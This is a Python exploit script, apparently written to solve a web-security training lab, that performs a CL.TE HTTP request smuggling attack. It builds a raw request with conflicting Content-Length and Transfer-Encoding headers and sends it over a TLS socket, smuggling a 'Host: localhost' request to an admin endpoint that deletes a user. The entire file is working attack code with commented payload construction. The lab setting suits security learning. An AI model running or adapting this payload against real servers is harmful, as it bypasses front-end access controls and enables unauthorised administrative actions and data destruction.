import sys
import requests
import urllib3
import ssl
import socket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability"""



def CL_TE_BYPASS_SECURITY(host_target,port_target):
    # First POST request to frontend
    # Set Content-Length to 146 to account for the full request size (frontend + backend smuggling)
    # Use Transfer-Encoding: chunked to send data in chunks
    # 3 (chunk size) followed by 'abs' as the chunk data for the frontend request
    # 0 (chunk size) marks the end of the frontend data
    # Second GET request to backend (admin deletion)
    # Use Host: localhost to trick the backend into treating this as a local request 
    # Content-Type and Content-Length to match the backend request format
    # The body contains x= with a length of 3 bytes. To avoid creating duplicate headers, the request will be smuggled and look like this: x=Host:....

    cl_te_pypass_payload=(
        "POST / HTTP/1.1\r\n"
        f"Host: {host_target}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 146\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "3\r\n"
        "abs\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin/delete?username=carlos HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 3\r\n"
        "\r\n"
        "x="
    )
    
    try:
            # Create SSL context for HTTPS
        #Creates a secure environment for HTTPS communication.
        context_ssl=ssl.create_default_context()
          #Opens a connection to the server (target_host) on the specified port (target_port).
        with socket.create_connection((host_target,port_target)) as sock:
            #Wraps the socket connection with encryption for secure data transfer.
            with context_ssl.wrap_socket(sock,server_hostname=host_target) as securesock:
                print('(+) Sending payload ....') #sending the payload 
                securesock.sendall(cl_te_pypass_payload.encode('utf-8'))
                response_payload=securesock.recv(4096) #recving data  
                #check if we have 200 OK response 
                if "HTTP/1.1 200 OK" in response_payload.decode(errors='ignore'):
                    print('(+) payload send .')
                    #After sending the request, we received an admin forbidden message. Therefore, we will send for a second requeste to get a normal response to test its functionality.
                    for i in range(1,3):
                        response_normal=requests.post("https://"+host_target,verify=False)
                        if "Congratulations, you solved the lab" in response_normal.text:
                            print("(+) User deleted successfully . ")
                        else:
                            pass
                #check if the host down or not 
                elif "504 Gateway Timeout" in response_payload.decode():
                    print("(-) No response received from the server.")
                    sys.exit()

                else:
                    print('(-) Error !')
    except Exception as err:
        print('(-) Error : %s'%err)



def main():
    if len(sys.argv) !=2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net'%sys.argv[0])
        sys.exit(1)
    
    host_target=sys.argv[1]
    port_target=443
    CL_TE_BYPASS_SECURITY(host_target,port_target)



if __name__=="__main__":
    main()